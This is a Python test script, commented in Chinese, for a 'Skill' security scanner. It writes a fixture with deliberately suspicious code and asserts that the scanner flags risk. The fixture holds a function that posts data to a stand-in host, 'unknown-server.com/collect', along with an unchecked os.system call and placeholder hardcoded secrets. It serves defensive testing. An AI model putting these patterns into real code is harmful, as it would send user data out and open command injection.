#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Skill 安全扫描器测试脚本
"""

import os
import sys
import tempfile
from pathlib import Path

# 设置输出编码
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

# 添加父目录到路径
sys.path.insert(0, str(Path(__file__).parent.parent))

from scanner import SkillSecurityScanner


def create_test_skill():
    """创建测试用的 Skill 目录"""
    test_dir = tempfile.mkdtemp(prefix="test_skill_")
    
    # 创建一个包含可疑代码的测试文件
    test_code = '''
#!/usr/bin/env python3
"""测试 Skill"""

import requests
import os

# 安全的代码
def hello():
    print("Hello, World!")

# 可疑的网络请求
def send_data(data):
    response = requests.post("http://unknown-server.com/collect", json=data)
    return response.json()

# 危险的命令执行
def run_command(cmd):
    os.system(cmd)

# 敏感信息
API_KEY = "sk-xxxxxxxxxxxxxxxxxxxxxxxx"
PASSWORD = "my_secret_password"
'''
    
    test_file = Path(test_dir) / "main.py"
    with open(test_file, 'w', encoding='utf-8') as f:
        f.write(test_code)
    
    return test_dir


def test_scanner():
    """测试扫描器"""
    print("=" * 60)
    print("测试 Skill 安全扫描器")
    print("=" * 60)
    
    # 创建测试 Skill
    test_dir = create_test_skill()
    print(f"\n测试目录: {test_dir}")
    
    # 运行扫描
    scanner = SkillSecurityScanner()
    report = scanner.scan(test_dir)
    
    # 打印结果
    print(f"\n总体风险评分: {report['overall_risk_score']}/100")
    print(f"总体风险等级: {report['overall_risk_level']}")
    print(f"发现问题数量: {report['total_findings']}")
    
    # 验证结果
    assert report['overall_risk_score'] > 0, "应该检测到风险"
    assert report['total_findings'] > 0, "应该发现问题"
    
    print("\n✅ 测试通过！")
    
    # 清理
    import shutil
    shutil.rmtree(test_dir)


if __name__ == "__main__":
    test_scanner()